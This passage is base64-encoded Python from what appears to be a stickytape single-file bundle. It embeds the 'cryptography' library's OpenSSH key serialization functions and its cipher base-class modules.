luZyBpcyBkb25lLlxyXG4gICAgIyBuZWVkIHRvIGZvbGxvdyBhcyBpdCB3cml0ZXMgemVyby1ieXRlIHBhZGRpbmcgdG9vLlxyXG4gICAgaWYgZWRhdGEgIT0gX1BBRERJTkdbOiBsZW4oZWRhdGEpXTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJDb3JydXB0IGRhdGE6IGludmFsaWQgcGFkZGluZyIpXHJcblxyXG4gICAgcmV0dXJuIHByaXZhdGVfa2V5XHJcblxyXG5cclxuZGVmIHNlcmlhbGl6ZV9zc2hfcHJpdmF0ZV9rZXkoXHJcbiAgICBwcml2YXRlX2tleTogX1NTSF9QUklWQVRFX0tFWV9UWVBFUyxcclxuICAgIHBhc3N3b3JkOiB0eXBpbmcuT3B0aW9uYWxbYnl0ZXNdID0gTm9uZSxcclxuKSAtPiBieXRlczpcclxuICAgICIiIlNlcmlhbGl6ZSBwcml2YXRlIGtleSB3aXRoIE9wZW5TU0ggY3VzdG9tIGVuY29kaW5nLiIiIlxyXG4gICAgaWYgcGFzc3dvcmQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgdXRpbHMuX2NoZWNrX2J5dGVzKCJwYXNzd29yZCIsIHBhc3N3b3JkKVxyXG4gICAgaWYgcGFzc3dvcmQgYW5kIGxlbihwYXNzd29yZCkgPiBfTUFYX1BBU1NXT1JEOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICJQYXNzd29yZHMgbG9uZ2VyIHRoYW4gNzIgYnl0ZXMgYXJlIG5vdCBzdXBwb3J0ZWQgYnkgIlxyXG4gICAgICAgICAgICAiT3BlblNTSCBwcml2YXRlIGtleSBmb3JtYXQiXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGlmIGlzaW5zdGFuY2UocHJpdmF0ZV9rZXksIGVjLkVsbGlwdGljQ3VydmVQcml2YXRlS2V5KTpcclxuICAgICAgICBrZXlfdHlwZSA9IF9lY2RzYV9rZXlfdHlwZShwcml2YXRlX2tleS5wdWJsaWNfa2V5KCkpXHJcbiAgICBlbGlmIGlzaW5zdGFuY2UocHJpdmF0ZV9rZXksIHJzYS5SU0FQcml2YXRlS2V5KTpcclxuICAgICAgICBrZXlfdHlwZSA9IF9TU0hfUlNBXHJcbiAgICBlbGlmIGlzaW5zdGFuY2UocHJpdmF0ZV9rZXksIGRzYS5EU0FQcml2YXRlS2V5KTpcclxuICAgICAgICBrZXlfdHlwZSA9IF9TU0hfRFNBXHJcbiAgICBlbGlmIGlzaW5zdGFuY2UocHJpdmF0ZV9rZXksIGVkMjU1MTkuRWQyNTUxOVByaXZhdGVLZXkpOlxyXG4gICAgICAgIGtleV90eXBlID0gX1NTSF9FRDI1NTE5XHJcbiAgICBlbHNlOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlVuc3VwcG9ydGVkIGtleSB0eXBlIilcclxuICAgIGtmb3JtYXQgPSBfbG9va3VwX2tmb3JtYXQoa2V5X3R5cGUpXHJcblxyXG4gICAgIyBzZXR1cCBwYXJhbWV0ZXJzXHJcbiAgICBmX2tkZm9wdGlvbnMgPSBfRnJhZ0xpc3QoKVxyXG4gICAgaWYgcGFzc3dvcmQ6XHJcbiAgICAgICAgY2lwaGVybmFtZSA9IF9ERUZBVUxUX0NJUEhFUlxyXG4gICAgICAgIGJsa2xlbiA9IF9TU0hfQ0lQSEVSU1tjaXBoZXJuYW1lXVszXVxyXG4gICAgICAgIGtkZm5hbWUgPSBfQkNSWVBUXHJcbiAgICAgICAgcm91bmRzID0gX0RFRkFVTFRfUk9VTkRTXHJcbiAgICAgICAgc2FsdCA9IG9zLnVyYW5kb20oMTYpXHJcbiAgICAgICAgZl9rZGZvcHRpb25zLnB1dF9zc2hzdHIoc2FsdClcclxuICAgICAgICBmX2tkZm9wdGlvbnMucHV0X3UzMihyb3VuZHMpXHJcbiAgICAgICAgY2lwaCA9IF9pbml0X2NpcGhlcihjaXBoZXJuYW1lLCBwYXNzd29yZCwgc2FsdCwgcm91bmRzKVxyXG4gICAgZWxzZTpcclxuICAgICAgICBjaXBoZXJuYW1lID0ga2RmbmFtZSA9IF9OT05FXHJcbiAgICAgICAgYmxrbGVuID0gOFxyXG4gICAgICAgIGNpcGggPSBOb25lXHJcbiAgICBua2V5cyA9IDFcclxuICAgIGNoZWNrdmFsID0gb3MudXJhbmRvbSg0KVxyXG4gICAgY29tbWVudCA9IGIiIlxyXG5cclxuICAgICMgZW5jb2RlIHB1YmxpYyBhbmQgcHJpdmF0ZSBwYXJ0cyB0b2dldGhlclxyXG4gICAgZl9wdWJsaWNfa2V5ID0gX0ZyYWdMaXN0KClcclxuICAgIGZfcHVibGljX2tleS5wdXRfc3Noc3RyKGtleV90eXBlKVxyXG4gICAga2Zvcm1hdC5lbmNvZGVfcHVibGljKHByaXZhdGVfa2V5LnB1YmxpY19rZXkoKSwgZl9wdWJsaWNfa2V5KVxyXG5cclxuICAgIGZfc2VjcmV0cyA9IF9GcmFnTGlzdChbY2hlY2t2YWwsIGNoZWNrdmFsXSlcclxuICAgIGZfc2VjcmV0cy5wdXRfc3Noc3RyKGtleV90eXBlKVxyXG4gICAga2Zvcm1hdC5lbmNvZGVfcHJpdmF0ZShwcml2YXRlX2tleSwgZl9zZWNyZXRzKVxyXG4gICAgZl9zZWNyZXRzLnB1dF9zc2hzdHIoY29tbWVudClcclxuICAgIGZfc2VjcmV0cy5wdXRfcmF3KF9QQURESU5HWzogYmxrbGVuIC0gKGZfc2VjcmV0cy5zaXplKCkgJSBibGtsZW4pXSlcclxuXHJcbiAgICAjIHRvcC1sZXZlbCBzdHJ1Y3R1cmVcclxuICAgIGZfbWFpbiA9IF9GcmFnTGlzdCgpXHJcbiAgICBmX21haW4ucHV0X3JhdyhfU0tfTUFHSUMpXHJcbiAgICBmX21haW4ucHV0X3NzaHN0cihjaXBoZXJuYW1lKVxyXG4gICAgZl9tYWluLnB1dF9zc2hzdHIoa2RmbmFtZSlcclxuICAgIGZfbWFpbi5wdXRfc3Noc3RyKGZfa2Rmb3B0aW9ucylcclxuICAgIGZfbWFpbi5wdXRfdTMyKG5rZXlzKVxyXG4gICAgZl9tYWluLnB1dF9zc2hzdHIoZl9wdWJsaWNfa2V5KVxyXG4gICAgZl9tYWluLnB1dF9zc2hzdHIoZl9zZWNyZXRzKVxyXG5cclxuICAgICMgY29weSByZXN1bHQgaW5mbyBieXRlYXJyYXlcclxuICAgIHNsZW4gPSBmX3NlY3JldHMuc2l6ZSgpXHJcbiAgICBtbGVuID0gZl9tYWluLnNpemUoKVxyXG4gICAgYnVmID0gbWVtb3J5dmlldyhieXRlYXJyYXkobWxlbiArIGJsa2xlbikpXHJcbiAgICBmX21haW4ucmVuZGVyKGJ1ZilcclxuICAgIG9mcyA9IG1sZW4gLSBzbGVuXHJcblxyXG4gICAgIyBlbmNyeXB0IGluLXBsYWNlXHJcbiAgICBpZiBjaXBoIGlzIG5vdCBOb25lOlxyXG4gICAgICAgIGNpcGguZW5jcnlwdG9yKCkudXBkYXRlX2ludG8oYnVmW29mczptbGVuXSwgYnVmW29mczpdKVxyXG5cclxuICAgIHR4dCA9IF9zc2hfcGVtX2VuY29kZShidWZbOm1sZW5dKVxyXG4gICAgYnVmW29mczptbGVuXSA9IGJ5dGVhcnJheShzbGVuKVxyXG4gICAgcmV0dXJuIHR4dFxyXG5cclxuXHJcbl9TU0hfUFVCTElDX0tFWV9UWVBFUyA9IHR5cGluZy5VbmlvbltcclxuICAgIGVjLkVsbGlwdGljQ3VydmVQdWJsaWNLZXksXHJcbiAgICByc2EuUlNBUHVibGljS2V5LFxyXG4gICAgZHNhLkRTQVB1YmxpY0tleSxcclxuICAgIGVkMjU1MTkuRWQyNTUxOVB1YmxpY0tleSxcclxuXVxyXG5cclxuXHJcbmRlZiBsb2FkX3NzaF9wdWJsaWNfa2V5KFxyXG4gICAgZGF0YTogYnl0ZXMsIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lXHJcbikgLT4gX1NTSF9QVUJMSUNfS0VZX1RZUEVTOlxyXG4gICAgIiIiTG9hZCBwdWJsaWMga2V5IGZyb20gT3BlblNTSCBvbmUtbGluZSBmb3JtYXQuIiIiXHJcbiAgICB1dGlscy5fY2hlY2tfYnl0ZXNsaWtlKCJkYXRhIiwgZGF0YSlcclxuXHJcbiAgICBtID0gX1NTSF9QVUJLRVlfUkMubWF0Y2goZGF0YSlcclxuICAgIGlmIG5vdCBtOlxyXG4gICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkludmFsaWQgbGluZSBmb3JtYXQiKVxyXG4gICAga2V5X3R5cGUgPSBvcmlnX2tleV90eXBlID0gbS5ncm91cCgxKVxyXG4gICAga2V5X2JvZHkgPSBtLmdyb3VwKDIpXHJcbiAgICB3aXRoX2NlcnQgPSBGYWxzZVxyXG4gICAgaWYgX0NFUlRfU1VGRklYID09IGtleV90eXBlWy1sZW4oX0NFUlRfU1VGRklYKSA6XTpcclxuICAgICAgICB3aXRoX2NlcnQgPSBUcnVlXHJcbiAgICAgICAga2V5X3R5cGUgPSBrZXlfdHlwZVs6IC1sZW4oX0NFUlRfU1VGRklYKV1cclxuICAgIGtmb3JtYXQgPSBfbG9va3VwX2tmb3JtYXQoa2V5X3R5cGUpXHJcblxyXG4gICAgdHJ5OlxyXG4gICAgICAgIHJlc3QgPSBtZW1vcnl2aWV3KGJpbmFzY2lpLmEyYl9iYXNlNjQoa2V5X2JvZHkpKVxyXG4gICAgZXhjZXB0IChUeXBlRXJyb3IsIGJpbmFzY2lpLkVycm9yKTpcclxuICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJJbnZhbGlkIGtleSBmb3JtYXQiKVxyXG5cclxuICAgIGlubmVyX2tleV90eXBlLCByZXN0ID0gX2dldF9zc2hzdHIocmVzdClcclxuICAgIGlmIGlubmVyX2tleV90eXBlICE9IG9yaWdfa2V5X3R5cGU6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiSW52YWxpZCBrZXkgZm9ybWF0IilcclxuICAgIGlmIHdpdGhfY2VydDpcclxuICAgICAgICBub25jZSwgcmVzdCA9IF9nZXRfc3Noc3RyKHJlc3QpXHJcbiAgICBwdWJsaWNfa2V5LCByZXN0ID0ga2Zvcm1hdC5sb2FkX3B1YmxpYyhyZXN0KVxyXG4gICAgaWYgd2l0aF9jZXJ0OlxyXG4gICAgICAgIHNlcmlhbCwgcmVzdCA9IF9nZXRfdTY0KHJlc3QpXHJcbiAgICAgICAgY2N0eXBlLCByZXN0ID0gX2dldF91MzIocmVzdClcclxuICAgICAgICBrZXlfaWQsIHJlc3QgPSBfZ2V0X3NzaHN0cihyZXN0KVxyXG4gICAgICAgIHByaW5jaXBhbHMsIHJlc3QgPSBfZ2V0X3NzaHN0cihyZXN0KVxyXG4gICAgICAgIHZhbGlkX2FmdGVyLCByZXN0ID0gX2dldF91NjQocmVzdClcclxuICAgICAgICB2YWxpZF9iZWZvcmUsIHJlc3QgPSBfZ2V0X3U2NChyZXN0KVxyXG4gICAgICAgIGNyaXRfb3B0aW9ucywgcmVzdCA9IF9nZXRfc3Noc3RyKHJlc3QpXHJcbiAgICAgICAgZXh0ZW5zaW9ucywgcmVzdCA9IF9nZXRfc3Noc3RyKHJlc3QpXHJcbiAgICAgICAgcmVzZXJ2ZWQsIHJlc3QgPSBfZ2V0X3NzaHN0cihyZXN0KVxyXG4gICAgICAgIHNpZ19rZXksIHJlc3QgPSBfZ2V0X3NzaHN0cihyZXN0KVxyXG4gICAgICAgIHNpZ25hdHVyZSwgcmVzdCA9IF9nZXRfc3Noc3RyKHJlc3QpXHJcbiAgICBfY2hlY2tfZW1wdHkocmVzdClcclxuICAgIHJldHVybiBwdWJsaWNfa2V5XHJcblxyXG5cclxuZGVmIHNlcmlhbGl6ZV9zc2hfcHVibGljX2tleShwdWJsaWNfa2V5OiBfU1NIX1BVQkxJQ19LRVlfVFlQRVMpIC0+IGJ5dGVzOlxyXG4gICAgIiIiT25lLWxpbmUgcHVibGljIGtleSBmb3JtYXQgZm9yIE9wZW5TU0giIiJcclxuICAgIGlmIGlzaW5zdGFuY2UocHVibGljX2tleSwgZWMuRWxsaXB0aWNDdXJ2ZVB1YmxpY0tleSk6XHJcbiAgICAgICAga2V5X3R5cGUgPSBfZWNkc2Ffa2V5X3R5cGUocHVibGljX2tleSlcclxuICAgIGVsaWYgaXNpbnN0YW5jZShwdWJsaWNfa2V5LCByc2EuUlNBUHVibGljS2V5KTpcclxuICAgICAgICBrZXlfdHlwZSA9IF9TU0hfUlNBXHJcbiAgICBlbGlmIGlzaW5zdGFuY2UocHVibGljX2tleSwgZHNhLkRTQVB1YmxpY0tleSk6XHJcbiAgICAgICAga2V5X3R5cGUgPSBfU1NIX0RTQVxyXG4gICAgZWxpZiBpc2luc3RhbmNlKHB1YmxpY19rZXksIGVkMjU1MTkuRWQyNTUxOVB1YmxpY0tleSk6XHJcbiAgICAgICAga2V5X3R5cGUgPSBfU1NIX0VEMjU1MTlcclxuICAgIGVsc2U6XHJcbiAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiVW5zdXBwb3J0ZWQga2V5IHR5cGUiKVxyXG4gICAga2Zvcm1hdCA9IF9sb29rdXBfa2Zvcm1hdChrZXlfdHlwZSlcclxuXHJcbiAgICBmX3B1YiA9IF9GcmFnTGlzdCgpXHJcbiAgICBmX3B1Yi5wdXRfc3Noc3RyKGtleV90eXBlKVxyXG4gICAga2Zvcm1hdC5lbmNvZGVfcHVibGljKHB1YmxpY19rZXksIGZfcHViKVxyXG5cclxuICAgIHB1YiA9IGJpbmFzY2lpLmIyYV9iYXNlNjQoZl9wdWIudG9ieXRlcygpKS5zdHJpcCgpXHJcbiAgICByZXR1cm4gYiIiLmpvaW4oW2tleV90eXBlLCBiIiAiLCBwdWJdKVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL2NpcGhlcnMvX19pbml0X18ucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuX2NpcGhlcmFsZ29yaXRobSBpbXBvcnQgKFxyXG4gICAgQmxvY2tDaXBoZXJBbGdvcml0aG0sXHJcbiAgICBDaXBoZXJBbGdvcml0aG0sXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuY2lwaGVycy5iYXNlIGltcG9ydCAoXHJcbiAgICBBRUFEQ2lwaGVyQ29udGV4dCxcclxuICAgIEFFQUREZWNyeXB0aW9uQ29udGV4dCxcclxuICAgIEFFQURFbmNyeXB0aW9uQ29udGV4dCxcclxuICAgIENpcGhlcixcclxuICAgIENpcGhlckNvbnRleHQsXHJcbilcclxuXHJcblxyXG5fX2FsbF9fID0gW1xyXG4gICAgIkNpcGhlciIsXHJcbiAgICAiQ2lwaGVyQWxnb3JpdGhtIixcclxuICAgICJCbG9ja0NpcGhlckFsZ29yaXRobSIsXHJcbiAgICAiQ2lwaGVyQ29udGV4dCIsXHJcbiAgICAiQUVBRENpcGhlckNvbnRleHQiLFxyXG4gICAgIkFFQUREZWNyeXB0aW9uQ29udGV4dCIsXHJcbiAgICAiQUVBREVuY3J5cHRpb25Db250ZXh0IixcclxuXVxyXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnY3J5cHRvZ3JhcGh5L2hhem1hdC9wcmltaXRpdmVzL19jaXBoZXJhbGdvcml0aG0ucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5pbXBvcnQgYWJjXHJcbmltcG9ydCB0eXBpbmdcclxuXHJcblxyXG4jIFRoaXMgZXhpc3RzIHRvIGJyZWFrIGFuIGltcG9ydCBjeWNsZS4gSXQgaXMgbm9ybWFsbHkgYWNjZXNzaWJsZSBmcm9tIHRoZVxyXG4jIGNpcGhlcnMgbW9kdWxlLlxyXG5cclxuXHJcbmNsYXNzIENpcGhlckFsZ29yaXRobShtZXRhY2xhc3M9YWJjLkFCQ01ldGEpOlxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYgbmFtZShzZWxmKSAtPiBzdHI6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgQSBzdHJpbmcgbmFtaW5nIHRoaXMgbW9kZSAoZS5nLiAiQUVTIiwgIkNhbWVsbGlhIikuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdHByb3BlcnR5XHJcbiAgICBkZWYga2V5X3NpemVzKHNlbGYpIC0+IHR5cGluZy5Gcm96ZW5TZXRbaW50XTpcclxuICAgICAgICAiIiJcclxuICAgICAgICBWYWxpZCBrZXkgc2l6ZXMgZm9yIHRoaXMgYWxnb3JpdGhtIGluIGJpdHNcclxuICAgICAgICAiIiJcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBrZXlfc2l6ZShzZWxmKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgVGhlIHNpemUgb2YgdGhlIGtleSBiZWluZyB1c2VkIGFzIGFuIGludGVnZXIgaW4gYml0cyAoZS5nLiAxMjgsIDI1NikuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuY2xhc3MgQmxvY2tDaXBoZXJBbGdvcml0aG0obWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIGtleTogYnl0ZXNcclxuXHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiBibG9ja19zaXplKHNlbGYpIC0+IGludDpcclxuICAgICAgICAiIiJcclxuICAgICAgICBUaGUgc2l6ZSBvZiBhIGJsb2NrIGFzIGFuIGludGVnZXIgaW4gYml0cyAoZS5nLiA2NCwgMTI4KS5cclxuICAgICAgICAiIiJcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2NyeXB0b2dyYXBoeS9oYXptYXQvcHJpbWl0aXZlcy9jaXBoZXJzL2Jhc2UucHknLCBiJyMgVGhpcyBmaWxlIGlzIGR1YWwgbGljZW5zZWQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBBcGFjaGUgTGljZW5zZSwgVmVyc2lvblxyXG4jIDIuMCwgYW5kIHRoZSBCU0QgTGljZW5zZS4gU2VlIHRoZSBMSUNFTlNFIGZpbGUgaW4gdGhlIHJvb3Qgb2YgdGhpcyByZXBvc2l0b3J5XHJcbiMgZm9yIGNvbXBsZXRlIGRldGFpbHMuXHJcblxyXG5cclxuaW1wb3J0IGFiY1xyXG5pbXBvcnQgdHlwaW5nXHJcblxyXG5mcm9tIGNyeXB0b2dyYXBoeS5leGNlcHRpb25zIGltcG9ydCAoXHJcbiAgICBBbHJlYWR5RmluYWxpemVkLFxyXG4gICAgQWxyZWFkeVVwZGF0ZWQsXHJcbiAgICBOb3RZZXRGaW5hbGl6ZWQsXHJcbilcclxuZnJvbSBjcnlwdG9ncmFwaHkuaGF6bWF0LnByaW1pdGl2ZXMuX2NpcGhlcmFsZ29yaXRobSBpbXBvcnQgQ2lwaGVyQWxnb3JpdGhtXHJcbmZyb20gY3J5cHRvZ3JhcGh5Lmhhem1hdC5wcmltaXRpdmVzLmNpcGhlcnMgaW1wb3J0IG1vZGVzXHJcblxyXG5cclxuaWYgdHlwaW5nLlRZUEVfQ0hFQ0tJTkc6XHJcbiAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5jaXBoZXJzIGltcG9ydCAoXHJcbiAgICAgICAgX0NpcGhlckNvbnRleHQgYXMgX0JhY2tlbmRDaXBoZXJDb250ZXh0LFxyXG4gICAgKVxyXG5cclxuXHJcbmNsYXNzIENpcGhlckNvbnRleHQobWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiB1cGRhdGUoc2VsZiwgZGF0YTogYnl0ZXMpIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFByb2Nlc3NlcyB0aGUgcHJvdmlkZWQgYnl0ZXMgdGhyb3VnaCB0aGUgY2lwaGVyIGFuZCByZXR1cm5zIHRoZSByZXN1bHRzXHJcbiAgICAgICAgYXMgYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIHVwZGF0ZV9pbnRvKHNlbGYsIGRhdGE6IGJ5dGVzLCBidWY6IGJ5dGVzKSAtPiBpbnQ6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUHJvY2Vzc2VzIHRoZSBwcm92aWRlZCBieXRlcyBhbmQgd3JpdGVzIHRoZSByZXN1bHRpbmcgZGF0YSBpbnRvIHRoZVxyXG4gICAgICAgIHByb3ZpZGVkIGJ1ZmZlci4gUmV0dXJucyB0aGUgbnVtYmVyIG9mIGJ5dGVzIHdyaXR0ZW4uXHJcbiAgICAgICAgIiIiXHJcblxyXG4gICAgQGFiYy5hYnN0cmFjdG1ldGhvZFxyXG4gICAgZGVmIGZpbmFsaXplKHNlbGYpIC0+IGJ5dGVzOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIFJldHVybnMgdGhlIHJlc3VsdHMgb2YgcHJvY2Vzc2luZyB0aGUgZmluYWwgYmxvY2sgYXMgYnl0ZXMuXHJcbiAgICAgICAgIiIiXHJcblxyXG5cclxuY2xhc3MgQUVBRENpcGhlckNvbnRleHQoQ2lwaGVyQ29udGV4dCwgbWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBhdXRoZW50aWNhdGVfYWRkaXRpb25hbF9kYXRhKHNlbGYsIGRhdGE6IGJ5dGVzKSAtPiBOb25lOlxyXG4gICAgICAgICIiIlxyXG4gICAgICAgIEF1dGhlbnRpY2F0ZXMgdGhlIHByb3ZpZGVkIGJ5dGVzLlxyXG4gICAgICAgICIiIlxyXG5cclxuXHJcbmNsYXNzIEFFQUREZWNyeXB0aW9uQ29udGV4dChBRUFEQ2lwaGVyQ29udGV4dCwgbWV0YWNsYXNzPWFiYy5BQkNNZXRhKTpcclxuICAgIEBhYmMuYWJzdHJhY3RtZXRob2RcclxuICAgIGRlZiBmaW5hbGl6ZV93aXRoX3RhZyhzZWxmLCB0YWc6IGJ5dGVzKSAtPiBieXRlczpcclxuICAgICAgICAiIiJcclxuICAgICAgICBSZXR1cm5zIHRoZSByZXN1bHRzIG9mIHByb2Nlc3NpbmcgdGhlIGZpbmFsIGJsb2NrIGFzIGJ5dGVzIGFuZCBhbGxvd3NcclxuICAgICAgICBkZWxheWVkIHBhc3Npbmcgb2YgdGhlIGF1dGhlbnRpY2F0aW9uIHRhZy5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5jbGFzcyBBRUFERW5jcnlwdGlvbkNvbnRleHQoQUVBRENpcGhlckNvbnRleHQsIG1ldGFjbGFzcz1hYmMuQUJDTWV0YSk6XHJcbiAgICBAYWJjLmFic3RyYWN0cHJvcGVydHlcclxuICAgIGRlZiB0YWcoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgUmV0dXJucyB0YWcgYnl0ZXMuIFRoaXMgaXMgb25seSBhdmFpbGFibGUgYWZ0ZXIgZW5jcnlwdGlvbiBpc1xyXG4gICAgICAgIGZpbmFsaXplZC5cclxuICAgICAgICAiIiJcclxuXHJcblxyXG5Nb2RlID0gdHlwaW5nLlR5cGVWYXIoXHJcbiAgICAiTW9kZSIsIGJvdW5kPXR5cGluZy5PcHRpb25hbFttb2Rlcy5Nb2RlXSwgY292YXJpYW50PVRydWVcclxuKVxyXG5cclxuXHJcbmNsYXNzIENpcGhlcih0eXBpbmcuR2VuZXJpY1tNb2RlXSk6XHJcbiAgICBkZWYgX19pbml0X18oXHJcbiAgICAgICAgc2VsZixcclxuICAgICAgICBhbGdvcml0aG06IENpcGhlckFsZ29yaXRobSxcclxuICAgICAgICBtb2RlOiBNb2RlLFxyXG4gICAgICAgIGJhY2tlbmQ6IHR5cGluZy5BbnkgPSBOb25lLFxyXG4gICAgKTpcclxuXHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UoYWxnb3JpdGhtLCBDaXBoZXJBbGdvcml0aG0pOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkV4cGVjdGVkIGludGVyZmFjZSBvZiBDaXBoZXJBbGdvcml0aG0uIilcclxuXHJcbiAgICAgICAgaWYgbW9kZSBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgIyBteXB5IG5lZWRzIHRoaXMgYXNzZXJ0IHRvIG5hcnJvdyB0aGUgdHlwZSBmcm9tIG91ciBnZW5lcmljXHJcbiAgICAgICAgICAgICMgdHlwZS4gTWF5YmUgaXQgd29uXCd0IHNvbWUgdGltZSBpbiB0aGUgZnV0dXJlLlxyXG4gICAgICAgICAgICBhc3NlcnQgaXNpbnN0YW5jZShtb2RlLCBtb2Rlcy5Nb2RlKVxyXG4gICAgICAgICAgICBtb2RlLnZhbGlkYXRlX2Zvcl9hbGdvcml0aG0oYWxnb3JpdGhtKVxyXG5cclxuICAgICAgICBzZWxmLmFsZ29yaXRobSA9IGFsZ29yaXRobVxyXG4gICAgICAgIHNlbGYubW9kZSA9IG1vZGVcclxuXHJcbiAgICBAdHlwaW5nLm92ZXJsb2FkXHJcbiAgICBkZWYgZW5jcnlwdG9yKFxyXG4gICAgICAgIHNlbGY6ICJDaXBoZXJbbW9kZXMuTW9kZVdpdGhBdXRoZW50aWNhdGlvblRhZ10iLFxyXG4gICAgKSAtPiBBRUFERW5jcnlwdGlvbkNvbnRleHQ6XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgQHR5cGluZy5vdmVybG9hZFxyXG4gICAgZGVmIGVuY3J5cHRvcihcclxuICAgICAgICBzZWxmOiAiX0NJUEhFUl9UWVBFIixcclxuICAgICkgLT4gQ2lwaGVyQ29udGV4dDpcclxuICAgICAgICAuLi5cclxuXHJcbiAgICBkZWYgZW5jcnlwdG9yKHNlbGYpOlxyXG4gICAgICAgIGlmIGlzaW5zdGFuY2Uoc2VsZi5tb2RlLCBtb2Rlcy5Nb2RlV2l0aEF1dGhlbnRpY2F0aW9uVGFnKTpcclxuICAgICAgICAgICAgaWYgc2VsZi5tb2RlLnRhZyBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoXHJcbiAgICAgICAgICAgICAgICAgICAgIkF1dGhlbnRpY2F0aW9uIHRhZyBtdXN0IGJlIE5vbmUgd2hlbiBlbmNyeXB0aW5nLiJcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kXHJcblxyXG4gICAgICAgIGN0eCA9IGJhY2tlbmQuY3JlYXRlX3N5bW1ldHJpY19lbmNyeXB0aW9uX2N0eChcclxuICAgICAgICAgICAgc2VsZi5hbGdvcml0aG0sIHNlbGYubW9kZVxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gc2VsZi5fd3JhcF9jdHgoY3R4LCBlbmNyeXB0PVRydWUpXHJcblxyXG4gICAgQHR5cGluZy5vdmVybG9hZFxyXG4gICAgZGVmIGRlY3J5cHRvcihcclxuICAgICAgICBzZWxmOiAiQ2lwaGVyW21vZGVzLk1vZGVXaXRoQXV0aGVudGljYXRpb25UYWddIixcclxuICAgICkgLT4gQUVBRERlY3J5cHRpb25Db250ZXh0OlxyXG4gICAgICAgIC4uLlxyXG5cclxuICAgIEB0eXBpbmcub3ZlcmxvYWRcclxuICAgIGRlZiBkZWNyeXB0b3IoXHJcbiAgICAgICAgc2VsZjogIl9DSVBIRVJfVFlQRSIsXHJcbiAgICApIC0+IENpcGhlckNvbnRleHQ6XHJcbiAgICAgICAgLi4uXHJcblxyXG4gICAgZGVmIGRlY3J5cHRvcihzZWxmKTpcclxuICAgICAgICBmcm9tIGNyeXB0b2dyYXBoeS5oYXptYXQuYmFja2VuZHMub3BlbnNzbC5iYWNrZW5kIGltcG9ydCBiYWNrZW5kXHJcblxyXG4gICAgICAgIGN0eCA9IGJhY2tlbmQuY3JlYXRlX3N5bW1ldHJpY19kZWNyeXB0aW9uX2N0eChcclxuICAgICAgICAgICAgc2